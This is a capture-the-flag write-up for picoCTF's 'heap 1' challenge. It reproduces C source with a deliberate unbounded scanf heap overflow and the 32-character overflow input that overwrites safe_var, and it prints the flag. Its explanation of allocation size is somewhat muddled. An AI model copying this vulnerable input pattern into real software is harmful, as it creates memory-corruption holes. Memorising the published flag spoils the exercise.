# heap 1

flag : picoCTF{starting_to_get_the_hang_e9fbcea5}

## My Approach
 I first look t the source code
 ```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

1. The program prints the flag if the safe_var variable equals "pico".
2. The objective is to modify safe_var to contain the string "pico"
3. Two memory allocations occur:
          input_data (5 bytes, initialized to "pico")
          safe_var (5 bytes, initialized to "bico")
     Both are allocated on the heap, which means they may be placed in contiguous memory locations.
4. scanf does not enforce bounds checking, meaning you can overflow the memory allocated for input_data and write into adjacent memory. This is a classic buffer overflow vulnerability.


*There is no exact size requested by malloc(). Instead, memory allocators usually align allocations to a multiple of some fixed size (e.g., 16 bytes, depending on the system and allocator).
As a result, even though input_data and safe_var request 5 bytes each, the actual allocated memory block for each is likely 16 bytes.
This means there is a 16-byte gap between the start of input_data and the start of safe_var (on systems where malloc uses 16-byte alignment).*
*The total amount of data required to overflow into safe_var would be:*

*- 16 bytes for input_data (actual allocation size),*
*- Another 16 bytes to overflow into safe_var.*
*- Thus, you need 32 characters to completely overwrite input_data and set safe_var to "pico".*

So, I enter option 2, and enters 32 a's and then pico.                     
I check by entering option 3 to ensure that safe_var is set to pico                             
Then I chose option 4 and got flag                   

## Terminal Output
```
1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_e9fbcea5}
```

## Errors
I didn'nt know how many characters wouold be needed to overwrite initially, so made a few mistakes there

## Resources
ChatGPT

## What did I learn
1. We can overflow into the next memory when there are two contiguous memory locations
2. malloc doesnt always specify size
3. even though safe_var was initialized with "bico", it could be overwritten by overflowing input_data
4. The distance between input_data and safe_var was critical in determining how much data to overflow.

